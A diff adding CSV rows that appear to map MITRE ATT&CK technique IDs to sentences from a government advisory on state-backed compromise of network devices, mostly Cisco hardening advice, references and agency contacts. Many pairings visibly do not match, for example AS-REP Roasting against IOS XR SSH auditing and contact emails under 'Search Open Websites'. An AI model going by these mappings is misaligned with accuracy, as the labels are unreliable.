+T1686,Disable or Modify System Firewall,"Require session protection (TCP-AO where supported, otherwise MD5) and monitor for BGP session resets and parameter changes from unexpected management origins.",21,True,True
+T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Ensure all logs sent to a centralized logging server are transmitted via a secure, authenticated, and encrypted channel (such as IPsec, TLS, or SSH tunnels).",21,True,True
+T1571,Non-Standard Port,Alert on additions that steer traffic toward non-standard GRE/IPsec endpoints or unexpected next hops.,21,True,True
+T1595.001,Scanning IP Blocks,"Continuously validate static routes, policy-based routing (PBR), and VRF- leak policies at peering edges.",21,True,True
+T1584.008,Network Devices,"Continuously validate static routes, policy-based routing (PBR), and VRF- leak policies at peering edges.",21,True,True
+T1201,Password Policy Discovery,"Audit for IPv6-reachable management services and tunnels, as the APT actors’ infrastructure includes IPv6 addresses.",21,True,True
+T1568.002,Domain Generation Algorithms,"Continuously validate static routes, policy-based routing (PBR), and VRF- leak policies at peering edges.",21,True,True
+T1568,Dynamic Resolution,"Continuously validate static routes, policy-based routing (PBR), and VRF- leak policies at peering edges.",21,True,True
+T1573.001,Symmetric Cryptography,"Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs).",22,True,True
+T1556.004,Network Device Authentication,Protect local credentials on Cisco networking devices using Type 8 (PBKDF2-SHA-256) where supported.,22,True,True
+T1048.001,Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Use Type 6 (AES) key encryption to protect stored secrets (e.g., TACACS+/RADIUS shared secrets or IKE PSKs).",22,True,True
+T1572,Protocol Tunneling,Audit for unexpected enablement of IOS XR host SSH (sshd_operns) on TCP/57722.,22,True,True
+T1557.003,DHCP Spoofing,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1686.002,Network Device Firewall,Ensure a final deny any any log line is added to all configured ACLs.,22,True,True
+T1556.005,Reversible Encryption,Protect local credentials on Cisco networking devices using Type 8 (PBKDF2-SHA-256) where supported.,22,True,True
+T1558.004,AS-REP Roasting,Audit for unexpected enablement of IOS XR host SSH (sshd_operns) on TCP/57722.,22,True,True
+T1599.001,Network Address Translation Traversal,"Disable outbound connections from the VTYs (e.g., transport output none).",22,True,True
+T1563.001,SSH Hijacking,Audit for unexpected enablement of IOS XR host SSH (sshd_operns) on TCP/57722.,22,True,True
+T1571,Non-Standard Port,Audit for unexpected enablement of IOS XR host SSH (sshd_operns) on TCP/57722.,22,True,True
+T1059.013,Container CLI/API,"For IOS XE, run guestshell disable to stop the container.",23,True,True
+T1059.013,Container CLI/API,"For NX-OS, run guestshell disable to stop the container.",23,True,True
+T1059.013,Container CLI/API,Use guestshell destroy to uninstall it and return resources to the system.,23,True,True
+T1059.013,Container CLI/API,Confirm with show guestshell.,23,True,True
+T1059.013,Container CLI/API,Confirm with show guestshell / show iox.,23,True,True
+T1059.008,Network Device CLI,Use guestshell destroy to uninstall it and return resources to the system.,23,True,True
+T1059.008,Network Device CLI,Confirm with show guestshell.,23,True,True
+T1059.008,Network Device CLI,Confirm with show guestshell / show iox.,23,True,True
+T1601.001,Patch System Image,"Perform periodic inventories and integrity checks of device storage (e.g., bootflash:) to detect unexpected files created from the container.",23,True,True
+T1602.002,Network Device Configuration Dump,"Consider Cisco Embedded Event Manager (EEM) policies that snapshot state (running processes, container filesystem, storage listings) when these events occur.",23,True,True
+T1590.003,Network Trust Dependencies,Compromise of Networks Worldwide to Feed Global Espionage System,24,True,True
+T1590.006,Network Security Appliances,Cisco Password Types: Best Practices,24,True,True
+T1686.002,Network Device Firewall,Cisco Smart Install Protocol Misuse,24,True,True
+T1059.008,Network Device CLI,Performing Out-of-Band Network Management,24,True,True
+T1016.002,Wi-Fi Discovery,Guidance on using IPsec to protect data,24,True,True
+T1599.001,Network Address Translation Traversal,Principles for secure privileged access workstations (PAWS),24,True,True
+T1114.003,Email Forwarding Rule,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1114,Email Collection,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1001,Data Obfuscation,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1011,Exfiltration Over Other Network Medium,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1584.008,Network Devices,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1596.002,WHOIS,Telecommunications Security Act (2021) Code of Practice,24,True,True
+T1590.001,Domain Properties,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1590.002,DNS,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1590.003,Network Trust Dependencies,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1591.001,Determine Physical Locations,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1591.002,Business Relationships,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1591.001,Determine Physical Locations,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1592,Gather Victim Host Information,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1593,Search Open Websites/Domains,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1596.001,DNS/Passive DNS,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1596.002,WHOIS,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1596.005,Scan Databases,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1597.001,Threat Intel Vendors,"Methods for initial access are a critical information gap for parties working to understand the scope, scale, and impact of these APT actors.",25,True,True
+T1593,Search Open Websites/Domains,https://report.ncsc.gov.uk/,26,True,True
+T1593,Search Open Websites/Domains,https://www.ofcom.org.uk,26,True,True
+T1593,Search Open Websites/Domains,https://supo.fi/en/contact,26,True,True
+T1593,Search Open Websites/Domains,https://www.sicurezzanazionale.gov.it/chi-siamo/organizzazione/aise,26,True,True
+T1593,Search Open Websites/Domains,https://www.sicurezzanazionale.gov.it/chi-siamo/organizzazione/aisi,26,True,True
+T1593,Search Open Websites/Domains,first-team@cyber.go.jp,26,True,True
+T1593,Search Open Websites/Domains,CTIteam@aw.gov.pl,26,True,True
+T1593,Search Open Websites/Domains,cyber.int@skw.gov.pl,26,True,True
